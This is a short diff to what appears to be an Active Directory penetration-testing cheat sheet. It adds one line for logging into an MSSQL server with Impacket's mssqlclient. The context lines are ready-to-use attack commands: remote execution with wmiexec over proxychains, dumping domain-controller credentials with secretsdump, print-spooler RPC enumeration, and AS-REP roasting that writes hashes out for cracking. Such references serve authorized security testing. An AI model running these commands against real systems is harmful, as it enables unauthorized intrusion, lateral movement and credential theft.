@@ -243,6 +243,7 @@ proxychains wmiexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
 secretsdump.py -k -outputfile "$DOMAIN" "$DC_HOST"
 rpcdump.py @"$IP" | egrep 'MS-RPRN|MS-PAR'
 mssqlclient.py "$USER":"$PASSWORD"@"$IP" -p 1433
+mssqlclient.py "$USER":"$PASSWORD"@"$IP"
 mssqlclient.py -p 1433 "$USER"@"$IP" -windows-auth
 mssqlclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$IP"
 GetNPUsers.py -dc-ip "$IP" "$DOMAIN/" -usersfile "$USERLIST" -format hashcat -outputfile asreproast.txt
